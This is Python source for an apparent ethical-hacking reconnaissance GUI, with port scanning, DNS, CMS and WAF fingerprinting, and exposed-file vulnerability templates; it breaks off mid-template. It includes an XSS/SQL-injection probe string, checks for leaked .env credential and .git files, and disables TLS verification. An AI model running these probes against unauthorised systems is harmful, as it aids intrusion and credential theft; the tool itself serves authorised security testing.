#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 pentest_dashboard.py  —  All-in-One Recon & Vulnerability Assessment Dashboard
================================================================================

A standalone, single-file, dark-themed desktop GUI for ethical-hacking
reconnaissance and lightweight vulnerability assessment.

Built entirely on the Python standard library (Tkinter + sockets + urllib),
so it runs on any machine with Python 3.8+ and zero pip installs. If Nmap
is installed it is used automatically for deep service/version scanning;
otherwise the app falls back to a fast native socket scanner.

Modules
-------
  1. Port Scanner        - Nmap wrapper (subprocess) w/ native socket fallback
  2. DNS & IP Recon      - Domain->IP, IP->Domain (PTR), NS/MX/TXT records
  3. Subdomain Finder    - Wordlist subdomain enum + per-subdomain IP resolve
  4. Admin Panel Finder  - Brute-forces common admin/login/control-panel paths
  5. Tech & CMS Detector - Web platform / CMS / framework fingerprinting
  6. WAF & Payment       - Web Application Firewall + payment gateway detection
  7. Vuln Checker        - Lightweight Nuclei-style signature/pattern matcher
  8. SQLi Scanner        - Safe error-based SQL injection parameter probe
  9. WP Plugins/Themes   - WordPress plugin & theme enumeration + versions
 10. WP Exploit Check    - WP core/plugin/theme known-vuln + misconfig matcher

Threading model
---------------
Every scan runs in a daemon worker thread. The worker posts log lines into a
thread-safe queue; the Tk main loop drains that queue every 50 ms via
`root.after()` and appends to the console. Tkinter is therefore only ever
touched from the main thread and the GUI never freezes.

LEGAL NOTICE: Only use this tool against systems you own or have explicit
written authorization to test. Unauthorized scanning may be illegal.
================================================================================
"""

import concurrent.futures
import ipaddress
import json
import os
import queue
import re
import shlex
import shutil
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime

import tkinter as tk
from tkinter import filedialog, messagebox, ttk

# ==============================================================================
#  CONSTANTS & THEME
# ==============================================================================

APP_NAME    = "Phr33k eYe"
APP_VERSION = "2.0.0"

THEME = {
    "bg":        "#0d1117",   # window background
    "bg_alt":    "#161b22",   # sidebar / panels
    "bg_input":  "#0b0f14",   # entry / console background
    "border":    "#30363d",
    "fg":        "#c9d1d9",   # primary text
    "fg_dim":    "#8b949e",   # secondary text
    "accent":    "#58a6ff",   # blue accent
    "green":     "#3fb950",
    "red":       "#f85149",
    "orange":    "#d29922",
    "purple":    "#bc8cff",
    "cyan":      "#39c5cf",
}

FONT_MONO   = ("Consolas", 10)
FONT_MONO_S = ("Consolas", 9)
FONT_UI     = ("Segoe UI", 10)
FONT_UI_B   = ("Segoe UI", 10, "bold")
FONT_TITLE  = ("Segoe UI", 13, "bold")

# Common web ports used by the native socket fallback scanner.
COMMON_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
    1433, 1521, 1723, 2049, 2082, 2083, 2086, 2087, 2095, 2096, 2181,
    2375, 3000, 3128, 3306, 3389, 3690, 4000, 4040, 4443, 4444, 4567,
    5000, 5001, 5432, 5601, 5672, 5900, 5984, 6000, 6379, 6667, 7001,
    7002, 8000, 8008, 8009, 8080, 8081, 8082, 8083, 8086, 8088, 8090,
    8181, 8443, 8888, 9000, 9001, 9042, 9090, 9092, 9200, 9300, 9418,
    9999, 10000, 11211, 15672, 27017, 27018, 28017, 50000,
]

# Best-effort service names for the native scanner.
PORT_SERVICES = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns", 80: "http",
    110: "pop3", 111: "rpcbind", 135: "msrpc", 139: "netbios-ssn",
    143: "imap", 443: "https", 445: "smb", 993: "imaps", 995: "pop3s",
    1433: "mssql", 1521: "oracle", 1723: "pptp", 2049: "nfs",
    3306: "mysql", 3389: "rdp", 5432: "postgresql", 5900: "vnc",
    6379: "redis", 8080: "http-proxy", 8443: "https-alt", 9200: "elasticsearch",
    11211: "memcached", 27017: "mongodb",
}

# Quiet, honest User-Agent used for all HTTP requests made by the app.
HTTP_UA = "VulnRecon-Dashboard/1.0 (+authorized-security-assessment)"

# ==============================================================================
#  SMALL UTILITIES
# ==============================================================================

def which(binary):
    """Return the full path of an external binary, or None if not installed."""
    return shutil.which(binary)


def normalize_target(raw):
    """
    Accept 'example.com', 'http://example.com/path', '1.2.3.4' and return a
    clean host (domain or IP) suitable for socket operations.
    """
    raw = (raw or "").strip()
    if not raw:
        return ""
    if "://" in raw:
        raw = urllib.parse.urlparse(raw).netloc
    raw = raw.split("/")[0].split("?")[0]
    if raw.count(":") == 1 and not re.search(r"[a-fA-F]", raw):  # host:port
        raw = raw.split(":")[0]
    return raw.strip("[]")


def is_ip(host):
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        return False


def resolve_host(host):
    """Resolve a hostname to a list of unique IP strings (may be empty)."""
    ips = []
    try:
        for fam, _, _, _, sockaddr in socket.getaddrinfo(host, None):
            ip = sockaddr[0]
            if ip not in ips:
                ips.append(ip)
    except socket.gaierror:
        pass
    return ips


def parse_ports(spec):
    """
    Parse an Nmap-style port spec ('22,80,443', '1-1024', 'top') into a sorted
    list of ints. 'top' / empty -> COMMON_PORTS.
    """
    spec = (spec or "").strip().lower()
    if spec in ("", "top", "common", "default"):
        return list(COMMON_PORTS)
    ports = set()
    for part in spec.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            a, b = part.split("-", 1)
            try:
                a, b = int(a), int(b)
            except ValueError:
                continue
            a, b = max(1, a), min(65535, b)
            if a <= b and (b - a) <= 20000:
                ports.update(range(a, b + 1))
        else:
            try:
                p = int(part)
                if 1 <= p <= 65535:
                    ports.add(p)
            except ValueError:
                continue
    return sorted(ports)


def http_request(url, method="GET", timeout=8, max_bytes=262144, headers=None):
    """
    Minimal HTTP(S) client built on urllib.

    Returns dict: {url, status, reason, headers(dict), body(str), error(str|None)}
    Never raises - network/TLS errors are reported via the 'error' key so the
    GUI can print a clean warning instead of crashing.
    """
    result = {"url": url, "status": 0, "reason": "", "headers": {},
              "body": "", "error": None}
    req_headers = {
        "User-Agent": HTTP_UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "close",
    }
    if headers:
        req_headers.update(headers)
    try:
        req = urllib.request.Request(url, method=method, headers=req_headers)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE  # recon tool: accept self-signed certs
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            raw = resp.read(max_bytes)
            result["status"] = resp.getcode() or 0
            result["reason"] = getattr(resp, "reason", "") or ""
            result["headers"] = {k.lower(): v for k, v in resp.headers.items()}
            result["url"] = resp.geturl()
            enc = resp.headers.get_content_charset() or "utf-8"
            result["body"] = raw.decode(enc, errors="replace")
    except urllib.error.HTTPError as e:
        # HTTP errors (403/404/500...) still carry useful headers/body.
        result["status"] = e.code
        result["reason"] = str(e.reason)
        try:
            result["headers"] = {k.lower(): v for k, v in e.headers.items()}
            result["body"] = e.read(max_bytes).decode("utf-8", errors="replace")
        except Exception:
            pass
    except urllib.error.URLError as e:
        result["error"] = f"URL error: {e.reason}"
    except socket.timeout:
        result["error"] = "Connection timed out"
    except ssl.SSLError as e:
        result["error"] = f"TLS error: {e}"
    except Exception as e:  # noqa: BLE001 - never crash the worker thread
        result["error"] = f"{type(e).__name__}: {e}"
    return result


def candidate_urls(host):
    """Return ['https://host', 'http://host'] unless host already has a scheme."""
    if host.startswith(("http://", "https://")):
        return [host]
    return [f"https://{host}", f"http://{host}"]


def fetch_first_working(host, log, timeout=8):
    """
    Try https:// then http:// for a host and return the first response dict
    that did not hit a transport-level error.
    """
    for url in candidate_urls(host):
        log(f"  → GET {url}", "dim")
        r = http_request(url, timeout=timeout)
        if r["error"]:
            log(f"    ✗ {r['error']}", "warn")
            continue
        log(f"    ✓ HTTP {r['status']} {r['reason']}", "ok")
        return r
    return None


# ==============================================================================
#  MODULE 1 — PORT SCANNER  (Nmap wrapper with native socket fallback)
# ==============================================================================

def run_port_scan(target, ports_spec, log, done):
    """
    Port scanning entry point.

    HOW IT TRIGGERS A SUBPROCESS:
      If the `nmap` binary is found on PATH we spawn it via
      subprocess.Popen(['nmap', '-sV', '-Pn', '-T4', '--top-ports'/'-p', ...])
      and stream stdout line-by-line into the GUI console. If Nmap is missing
      we print a clean warning and fall back to a threaded native
      socket.connect_ex() scanner (no subprocess needed).
    """
    host = normalize_target(target)
    if not host:
        log("[!] No target supplied.", "err"); done(False); return

    log(f"[*] Port scan target: {host}", "info")
    ips = resolve_host(host)
    if not ips:
        log(f"[!] Could not resolve '{host}'. Check the target and try again.", "err")
        done(False); return
    log(f"[*] Resolved → {', '.join(ips)}", "dim")

    nmap = which("nmap")
    if nmap:
        _nmap_scan(nmap, host, ports_spec, log, done)
    else:
        log("[!] Nmap binary not found on PATH.", "warn")
        log("[!] Falling back to native Python socket scanner "
            "(connect scan, no service-version detection).", "warn")
        _socket_scan(host, ports_spec, log, done)


def _nmap_scan(nmap_bin, host, ports_spec, log, done):
    """Spawn Nmap as a subprocess and stream its output into the console."""
    ports = parse_ports(ports_spec)
    cmd = [nmap_bin, "-sV", "-Pn", "-T4", "--version-light", "--open"]
    spec = (ports_spec or "").strip().lower()
    if spec in ("", "top", "common", "default"):
        cmd += ["--top-ports", "100"]
    else:
        cmd += ["-p", ",".join(str(p) for p in ports)]
    cmd.append(host)

    log(f"[*] Nmap detected: {nmap_bin}", "ok")
    log(f"[*] Executing subprocess: {' '.join(shlex.quote(c) for c in cmd)}", "info")
    log("─" * 72, "dim")
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )
    except OSError as e:
        log(f"[!] Failed to launch Nmap: {e}", "err")
        log("[!] Falling back to native socket scanner.", "warn")
        _socket_scan(host, ports_spec, log, done)
        return

    assert proc.stdout is not None
    for line in proc.stdout:            # stream nmap output in real time
        line = line.rstrip()
        if not line:
            continue
        tag = "dim"
        if re.match(r"^\d+/(tcp|udp)\s+open", line):
            tag = "ok"
        elif line.startswith(("Nmap scan report", "Service Info", "Host is up")):
            tag = "info"
        proc_line = line
        log("  " + proc_line, tag)
    rc = proc.wait()
    log("─" * 72, "dim")
    if rc == 0:
        log(f"[✓] Nmap finished successfully (exit {rc}).", "ok")
        done(True)
    else:
        log(f"[!] Nmap exited with code {rc}.", "err")
        done(False)


def _grab_banner(host, port, timeout=2.0):
    """Best-effort banner grab for the native scanner."""
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            if port in (80, 8080, 8000, 8888):
                s.sendall(b"HEAD / HTTP/1.0\r\nHost: x\r\n\r\n")
            data = s.recv(160)
            banner = data.decode("utf-8", errors="replace").strip()
            banner = re.sub(r"\s+", " ", banner)
            return banner[:100]
    except Exception:
        return ""


def _socket_scan(host, ports_spec, log, done):
    """
    Native threaded TCP connect scanner (no external binaries required).
    Uses a ThreadPoolExecutor so hundreds of ports are checked in seconds.
    """
    ports = parse_ports(ports_spec)
    if not ports:
        log("[!] No valid ports parsed from the port specification.", "err")
        done(False); return

    log(f"[*] Native socket scan: {len(ports)} ports on {host}", "info")
    log("─" * 72, "dim")
    t0 = time.time()
    open_ports = []

    def probe(port):
        try:
            with socket.create_connection((host, port), timeout=1.2):
                return port, True
        except Exception:
            return port, False

    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as pool:
        for port, is_open in pool.map(probe, ports):
            if is_open:
                open_ports.append(port)
                svc = PORT_SERVICES.get(port, "unknown")
                banner = _grab_banner(host, port)
                extra = f"  |  {banner}" if banner else ""
                log(f"  [OPEN]  {port:>5}/tcp  {svc:<14}{extra}", "ok")

    dt = time.time() - t0
    log("─" * 72, "dim")
    log(f"[✓] Scan complete in {dt:.1f}s — {len(open_ports)} open / "
        f"{len(ports)} tested.", "ok" if open_ports else "info")
    if not open_ports:
        log("[i] No open ports found (host may be filtered or down).", "dim")
    done(True)


# ==============================================================================
#  MODULE 2 — DNS & IP RECON
# ==============================================================================

def run_dns_recon(target, log, done):
    """
    Domain→IP (A/AAAA), IP→Domain (PTR reverse lookup), plus NS/MX/TXT/CNAME
    records via a tiny hand-rolled DNS wire-format query (stdlib only, so no
    dnspython dependency). Falls back gracefully if UDP/53 is blocked.
    """
    host = normalize_target(target)
    if not host:
        log("[!] No target supplied.", "err"); done(False); return

    log(f"[*] DNS & IP recon for: {host}", "info")
    log("─" * 72, "dim")

    if is_ip(host):
        # ---------------- Reverse path: IP -> Domain ----------------
        log(f"[*] Reverse DNS (PTR) lookup for {host}", "info")
        try:
            name, aliases, _ = socket.gethostbyaddr(host)
            log(f"  ✓ PTR  → {name}", "ok")
            for a in aliases:
                log(f"  ✓ alias→ {a}", "ok")
        except socket.herror:
            log("  ✗ No PTR record found (host has no reverse DNS).", "warn")
        _dns_records_for_ptr(host, log)
    else:
        # ---------------- Forward path: Domain -> IP ----------------
        ips = resolve_host(host)
        if ips:
            v4 = [i for i in ips if ":" not in i]
            v6 = [i for i in ips if ":" in i]
            for ip in v4:
                log(f"  ✓ A     → {ip}", "ok")
            for ip in v6:
                log(f"  ✓ AAAA  → {ip}", "ok")
        else:
            log(f"  ✗ Could not resolve {host} (NXDOMAIN or DNS failure).", "err")

        # Reverse each resolved IP for the mapping table.
        for ip in ips:
            if ":" in ip:
                continue
            try:
                name, _, _ = socket.gethostbyaddr(ip)
                log(f"  ✓ {ip} PTR → {name}", "dim")
            except socket.herror:
                log(f"  · {ip} PTR → (none)", "dim")

        # Raw DNS records via minimal wire-format resolver.
        for rtype in ("NS", "MX", "TXT", "CNAME", "SOA"):
            records = _dns_query(host, rtype)
            if records is None:
                log(f"  · {rtype:<6} query failed (UDP/53 blocked?)", "dim")
                continue
            if not records:
                log(f"  · {rtype:<6} (no records)", "dim")
            for rec in records:
                log(f"  ✓ {rtype:<6} → {rec}", "ok")

    log("─" * 72, "dim")
    log("[✓] DNS recon complete.", "ok")
    done(True)


def _dns_records_for_ptr(ip, log):
    """Extra context for an IP target: try to find its network owner hints."""
    log("[i] Tip: run the module with a domain to enumerate NS/MX/TXT records.", "dim")


# ---- Minimal DNS wire-format resolver (stdlib only) -------------------------

_DNS_TYPES = {"A": 1, "NS": 2, "CNAME": 5, "SOA": 6, "PTR": 12, "MX": 15,
              "TXT": 16, "AAAA": 28}


def _dns_query(name, rtype, server="8.8.8.8", timeout=4):
    """
    Send a single DNS query over UDP and parse the answer section.
    Returns a list of strings, [] for NODATA, or None on transport failure.
    """
    qtype = _DNS_TYPES.get(rtype)
    if qtype is None:
        return []

    # Build query packet -------------------------------------------------
    tid = os.urandom(2)
    header = tid + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" * 3
    qname = b"".join(bytes([len(p)]) + p.encode("idna")
                     for p in name.rstrip(".").split(".")) + b"\x00"
    packet = header + qname + qtype.to_bytes(2, "big") + b"\x00\x01"

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(timeout)
            s.sendto(packet, (server, 53))
            data, _ = s.recvfrom(4096)
    except Exception:
        return None

    if len(data) < 12 or data[:2] != tid:
        return None
    ancount = int.from_bytes(data[6:8], "big")
    if ancount == 0:
        return []

    def read_name(buf, offset, depth=0):
        """Decode a (possibly compressed) DNS name starting at offset."""
        labels, jumped, end = [], False, offset
        while offset < len(buf) and depth < 20:
            ln = buf[offset]
            if ln == 0:
                offset += 1
                if not jumped:
                    end = offset
                break
            if ln & 0xC0 == 0xC0:  # compression pointer
                ptr = ((ln & 0x3F) << 8) | buf[offset + 1]
                if not jumped:
                    end = offset + 2
                offset = ptr
                jumped = True
                depth += 1
                continue
            offset += 1
            labels.append(buf[offset:offset + ln].decode("idna", "replace"))
            offset += ln
            if not jumped:
                end = offset
        return ".".join(labels), end

    # Skip question section ----------------------------------------------
    offset = 12
    qdcount = int.from_bytes(data[4:6], "big")
    for _ in range(qdcount):
        _, offset = read_name(data, offset)
        offset += 4

    answers = []
    for _ in range(ancount):
        try:
            _, offset = read_name(data, offset)
            rtype_n = int.from_bytes(data[offset:offset + 2], "big")
            rdlength = int.from_bytes(data[offset + 8:offset + 10], "big")
            rdata_off = offset + 10
            rdata = data[rdata_off:rdata_off + rdlength]
            offset = rdata_off + rdlength

            if rtype_n == 1 and rdlength == 4:                       # A
                answers.append(socket.inet_ntoa(rdata))
            elif rtype_n == 28 and rdlength == 16:                   # AAAA
                answers.append(socket.inet_ntop(socket.AF_INET6, rdata))
            elif rtype_n in (2, 5, 12):                              # NS/CNAME/PTR
                nm, _ = read_name(data, rdata_off)
                answers.append(nm)
            elif rtype_n == 15:                                      # MX
                pref = int.from_bytes(rdata[:2], "big")
                nm, _ = read_name(data, rdata_off + 2)
                answers.append(f"{nm} (pref {pref})")
            elif rtype_n == 16:                                      # TXT
                txts, i = [], 0
                while i < len(rdata):
                    ln = rdata[i]; i += 1
                    txts.append(rdata[i:i + ln].decode("utf-8", "replace"))
                    i += ln
                answers.append(" ".join(txts)[:200])
            elif rtype_n == 6:                                       # SOA
                mname, p = read_name(data, rdata_off)
                rname, _ = read_name(data, p)
                answers.append(f"{mname} {rname}")
        except Exception:
            break
    return answers


# ==============================================================================
#  MODULE 3 — TECHNOLOGY & CMS DETECTOR
# ==============================================================================

# (name, where, regex) — where: 'header:<name>' | 'body' | 'header-any'
TECH_SIGNATURES = [
    # --- CMS ---
    ("WordPress",            "body",  r'wp-content/|wp-includes/|name=["\']generator["\'] content=["\']WordPress'),
    ("WordPress (REST API)", "header-any", r'x-pingback|link:.*wp-json'),
    ("Joomla",               "body",  r'content=["\']Joomla!|/media/system/js/|com_content'),
    ("Drupal",               "header-any", r'x-drupal-cache|x-generator:.*drupal'),
    ("Drupal",               "body",  r'sites/default/files|Drupal\.settings'),
    ("Magento",              "body",  r'Mage\.Cookies|/skin/frontend/|mage/cookies'),
    ("Shopify",              "header-any", r'x-shopify|shopify'),
    ("Shopify",              "body",  r'cdn\.shopify\.com|Shopify\.theme'),
    ("Wix",                  "header-any", r'x-wix'),
    ("Squarespace",          "body",  r'squarespace\.com|static1\.squarespace'),
    ("Blogger",              "body",  r'content=["\']blogger["\']|blogger\.com'),
    ("PrestaShop",           "body",  r'prestashop|/modules/ps_'),
    ("OpenCart",             "body",  r'catalog/view/theme|index\.php\?route='),
    ("Ghost",                "body",  r'content=["\']Ghost'),
    # --- Frameworks / JS libs ---
    ("React",                "body",  r'data-reactroot|react-dom|__REACT_DEVTOOLS'),
    ("Vue.js",               "body",  r'data-v-[0-9a-f]{8}|vue(?:\.min)?\.js|__vue__'),
    ("Angular",              "body",  r'ng-app|ng-version=|angular(?:\.min)?\.js'),
    ("jQuery",               "body",  r'jquery[-.]?\d*\.?(?:min\.)?js'),
    ("Bootstrap",            "body",  r'bootstrap(?:\.min)?\.(?:css|js)'),
    ("Next.js",              "header-any", r'x-nextjs|__next'),
    ("Next.js",              "body",  r'__NEXT_DATA__'),
    ("Nuxt",                 "body",  r'__NUXT__'),
    ("Laravel",              "header-any", r'laravel_session'),
    ("Django",               "header-any", r'csrftoken'),
    ("ASP.NET",              "header-any", r'x-aspnet-version|asp\.net_sessionid|x-powered-by:.*asp\.net'),
    ("Express (Node.js)",    "header-any", r'x-powered-by:.*express'),
    ("PHP",                  "header-any", r'x-powered-by:.*php|phpsessid'),
    # --- Servers / infra ---
    ("Cloudflare",           "header-any", r'cf-ray|cf-cache-status|server:.*cloudflare'),
    ("Varnish",              "header-any", r'x-varnish|via:.*varnish'),
    ("Vercel",               "header-any", r'x-vercel|server:.*vercel'),
    ("Netlify",              "header-any", r'x-nf-request-id|server:.*netlify'),
    ("Google Analytics",     "body",  r'google-analytics\.com|gtag\(|UA-\d{4,}-\d+'),
    ("Google Tag Manager",   "body",  r'googletagmanager\.com'),
    ("reCAPTCHA",            "body",  r'google\.com/recaptcha'),
    ("Font Awesome",         "body",  r'font-awesome|fontawesome'),
]


def run_tech_detect(target, log, done):
    """
    Fetches the target homepage and fingerprints CMS/framework/server tech by
    matching signature regexes against response headers and body.
    Pure Python - no subprocess required.
    """
    host = normalize_target(target)
    if not host:
        log("[!] No target supplied.", "err"); done(False); return

    log(f"[*] Technology & CMS detection: {host}", "info")
    log("─" * 72, "dim")
    resp = fetch_first_working(host, log)
    if not resp:
        log("[!] Target did not respond over HTTP/HTTPS.", "err")
        done(False); return

    headers_flat = "\n".join(f"{k}: {v}" for k, v in resp["headers"].items()).lower()
    body = resp["body"]
    found = []

    # --- Server / powered-by headers first (high signal) ---
    for h in ("server", "x-powered-by", "x-generator", "x-aspnet-version",
              "x-drupal-cache", "x-shopify-stage"):
        if h in resp["headers"]:
            log(f"  ✓ header {h}: {resp['headers'][h]}", "ok")

    # --- Signature sweep ---
    for name, where, pattern in TECH_SIGNATURES:
        haystack = body if where == "body" else headers_flat
        if re.search(pattern, haystack, re.IGNORECASE):
            if name not in found:
                found.append(name)

    # --- Cookie-based hints ---
    set_cookie = resp["headers"].get("set-cookie", "")
    cookie_hints = {
        "PHPSESSID": "PHP", "laravel_session": "Laravel",
        "wordpress_": "WordPress", "wp-settings": "WordPress",
        "JSESSIONID": "Java (Servlet)", "ASP.NET_SessionId": "ASP.NET",
        "csrftoken": "Django", "connect.sid": "Express (Node.js)",
        "frontend=": "Magento",
    }
    for needle, tech in cookie_hints.items():
        if needle.lower() in set_cookie.lower() and tech not in found:
            found.append(tech)

    # --- /wp-json probe for WordPress confirmation ---
    if "WordPress" in found:
        base = urllib.parse.urlparse(resp["url"])
        wp = http_request(f"{base.scheme}://{base.netloc}/wp-json/wp/v2/",
                          timeout=6)
        if wp["status"] in (200, 401, 403) and "wp/v2" in wp["body"]:
            log("  ✓ WordPress REST API confirmed at /wp-json/wp/v2/", "ok")

    log("─" * 72, "dim")
    if found:
        log(f"[✓] Detected {len(found)} technolog{'y' if len(found)==1 else 'ies'}:",
            "ok")
        for t in found:
            log(f"      • {t}", "ok")
    else:
        log("[i] No known technologies/CMS fingerprints matched.", "warn")
    done(True)


# ==============================================================================
#  MODULE 4 — WAF & PAYMENT GATEWAY DETECTOR
# ==============================================================================

# (waf name, where, regex) — where: 'headers' | 'body' | 'status'
WAF_SIGNATURES = [
    ("Cloudflare",        "headers", r'cf-ray|cf-cache-status|server:\s*cloudflare|__cfduid|cf_clearance'),
    ("Cloudflare (challenge page)", "body", r'attention required! \| cloudflare|cf-browser-verification|checking your browser'),
    ("Akamai Kona",       "headers", r'akamai|x-akamai|akamai-ghost'),
    ("AWS WAF / CloudFront", "headers", r'x-amz-cf-id|x-amz-cf-pop|x-amzn-requestid|cloudfront'),
    ("AWS WAF (block page)", "body",  r'aws.?waf|request blocked.*generated by cloudfront'),
    ("Sucuri",            "headers", r'x-sucuri-id|x-sucuri-cache|server:\s*sucuri'),
    ("Sucuri (block page)", "body",   r'sucuri website firewall|access denied - sucuri'),
    ("Incapsula / Imperva", "headers", r'x-iinfo|incap_ses|visid_incap|x-cdn:\s*incapsula'),
    ("Incapsula (block page)", "body", r'incapsula incident id|_incapsula_resource'),
    ("ModSecurity",       "body",    r'mod_security|modsecurity|this error was generated by mod_security'),
    ("F5 BIG-IP ASM",     "headers", r'bigip|f5-|x-wa-info|ts[a-f0-9]{3,}='),
    ("F5 BIG-IP (block page)", "body", r'the requested url was rejected.*support id'),
    ("Barracuda",         "headers", r'barra_counter_session|barracuda'),
    ("Fortinet FortiWeb", "headers", r'fortiwafsid|fortiweb'),
    ("DDoS-Guard",        "headers", r'server:\s*ddos-guard|__ddg'),
    ("StackPath",         "headers", r'x-sp-waf|stackpath'),
    ("Fastly",            "headers", r'x-served-by:.*cache-|fastly-|x-fastly'),
    ("Wordfence",         "body",    r'generated by wordfence|wordfence'),
    ("Nginx generic block", "body",  r'<center>nginx</center>.*403 forbidden'),
    ("Generic 403 block", "status",  r'^403$'),
]

# (gateway name, regex against page body)
PAYMENT_SIGNATURES = [
    ("Stripe",            r'js\.stripe\.com|stripe\.com/v\d|pk_live_|pk_test_|Stripe\('),
    ("PayPal",            r'paypal\.com/sdk|paypalobjects\.com|paypal\.Buttons|data-paypal'),
    ("Square",            r'squareup\.com|square\.js|web-payments-sdk'),
    ("Braintree",         r'braintreegateway\.com|braintree-api|braintree\.js'),
    ("Authorize.Net",     r'authorize\.net|acceptjs|accept\.js'),
    ("Adyen",             r'adyen\.com|adyen-checkout|checkoutshopper'),
    ("Razorpay",          r'checkout\.razorpay\.com|razorpay\.js'),
    ("Mollie",            r'mollie\.com|mollie.js'),
    ("2Checkout/Verifone", r'2checkout\.com|2co\.js|avangate'),
    ("Klarna",            r'klarna\.com|klarna-payments'),
    ("Apple Pay",         r'apple-pay|applepay|ApplePaySession'),
    ("Google Pay",        r'pay\.google\.com|googlepay|GooglePayment'),
    ("Amazon Pay",        r'payments\.amazon\.com|amazonpay'),
    ("WooCommerce",       r'woocommerce|wc-ajax|add-to-cart'),
    ("Shopify Payments",  r'shopify\.com/.*payments|Shopify\.shop'),
    ("Coinbase Commerce", r'commerce\.coinbase\.com'),
    ("BitPay",            r'bitpay\.com'),
    ("Checkout.com",      r'checkout\.com|cko-'),
    ("Worldpay",          r'worldpay\.com'),
    ("Skrill",            r'skrill\.com'),
    ("PayU",              r'payu\.(?:com|in)|payu_'),
]


def run_waf_payment(target, log, done):
    """
    Detects Web Application Firewalls (header/body/status signatures + an
    active probe with a benign 'attack' query string to observe blocking
    behavior) and embedded payment gateways (body signatures).
    """
    host = normalize_target(target)
    if not host:
        log("[!] No target supplied.", "err"); done(False); return

    log(f"[*] WAF & payment gateway detection: {host}", "info")
    log("─" * 72, "dim")
    resp = fetch_first_working(host, log)
    if not resp:
        log("[!] Target did not respond over HTTP/HTTPS.", "err")
        done(False); return

    headers_flat = "\n".join(f"{k}: {v}" for k, v in resp["headers"].items()).lower()
    body = resp["body"]

    # ---------------- WAF detection ----------------
    log("[*] Passive WAF fingerprinting (headers/body/status)...", "info")
    wafs = []
    for name, where, pattern in WAF_SIGNATURES:
        if where == "headers":
            hay = headers_flat
        elif where == "body":
            hay = body
        else:
            hay = str(resp["status"])
        if re.search(pattern, hay, re.IGNORECASE | re.DOTALL):
            if name not in wafs:
                wafs.append(name)
                log(f"  ✓ {name}", "ok")

    # Active probe: send a harmless but WAF-triggering query string and
    # compare the response code. This is a standard wafw00f-style technique.
    log("[*] Active probe: sending benign test payload (?q=<script>test</script>)...",
        "dim")
    base = urllib.parse.urlparse(resp["url"])
    probe_url = f"{base.scheme}://{base.netloc}/?q=%3Cscript%3Etest%3C%2Fscript%3E" \
                f"%27%20OR%201%3D1--"
    probe = http_request(probe_url, timeout=8)
    if not probe["error"]:
        if probe["status"] in (403, 406, 419, 429, 501) and resp["status"] < 400:
            log(f"  ✓ Active probe blocked (HTTP {probe['status']}) — "
                f"a WAF/IPS is very likely in front of this host.", "ok")
            if not wafs:
                wafs.append("Unknown WAF (behavioral detection)")
        else:
            log(f"  · Probe returned HTTP {probe['status']} "
                f"(no obvious blocking behavior).", "dim")

    if not wafs:
        log("  ✗ No WAF signatures matched — target may be unprotected "
            "or using an unrecognized solution.", "warn")

    # ---------------- Payment gateway detection ----------------
    log("[*] Scanning page for embedded payment gateways...", "info")
    gateways = []
    for name, pattern in PAYMENT_SIGNATURES:
        if re.search(pattern, body, re.IGNORECASE):
            gateways.append(name)
            log(f"  ✓ {name}", "ok")
    if not gateways:
        log("  · No payment gateway fingerprints found on the landing page.",
            "dim")

    log("─" * 72, "dim")
    log(f"[✓] WAF: {', '.join(wafs) if wafs else 'none detected'}", "ok")
    log(f"[✓] Payment: {', '.join(gateways) if gateways else 'none detected'}", "ok")
    done(True)


# ==============================================================================
#  MODULE 5 — VULNERABILITY & EXPLOIT CHECKER (Nuclei-style)
# ==============================================================================

# Each "template" mimics a lightweight Nuclei check:
#   id, name, severity, method, path(s), matchers (status / header / body regex)
VULN_TEMPLATES = [
    {
        "id": "exposed-env",
        "name": "Exposed .env file (credentials leak)",
        "severity": "CRITICAL",
        "paths": ["/.env", "/.env.local", "/.env.production"],
        "status": [200],
        "body": r"(DB_PASSWORD|APP_KEY|SECRET|AWS_ACCESS_KEY|DATABASE_URL)\s*=",
    },
    {
        "id": "exposed-git",
        "name": "Exposed .git directory (source code leak)",
        "severity": "HIGH",
        "paths": ["/.git/HEAD", "/.git/config"],
        "status": [200],
        "body": r"(ref:\s*refs/heads|\[core\]|repositoryformatversion)",
    },
    {
        "id": "exposed-svn",
        "name": "Exposed .svn directory",
        "severity": "MEDIUM",
        "paths": ["/.svn/entries", "/.svn/wc.db"],
        "status": [200],
        "body": r"(dir|svn:)",
    },
    {
        "id": "debug-phpinfo",
        "name": "phpinfo() page exposed",
        "severity": "MEDIUM",
        "paths": ["/phpinfo.php", "/info.php", "/test.php?phpinfo=1"],
        "status": [200],
        "body": r"<title>phpinfo\(\)</title>|PHP Version</td>",
    },
    {
        "id": "server-status",
        "name": "Apache server-status exposed",
        "severity": "MEDIUM",
        "paths": ["/server-status", "/server-status/"],
        "status": [200],
        "body": r"Apache Server Status|Scoreboard Key",
    },
    {
        "id": "actuator-exposure",
        "name": "Spring Boot Actuator endpoints exposed",
        "severity": "HIGH",
        "paths": ["/actuator", "/actuator/env", "/actuator/heapdump"],
        "status": [200],
        "body": r"(_links|propertySources|heapdump)",
    },
    {
        "id": "jenkins-unauth",
        "name": "Jenkins dashboard accessible (unauthenticated)",
        "severity": "HIGH",
        "paths": ["/jenkins/", "/jenkins/login"],
        "status": [200],
        "body": r"Jenkins|hudson",
        "header": r"x-jenkins",
    },
    {
        "id": "wp-xmlrpc",
        "name": "WordPress xmlrpc.php enabled (bruteforce/pingback vector)",
        "severity": "LOW",
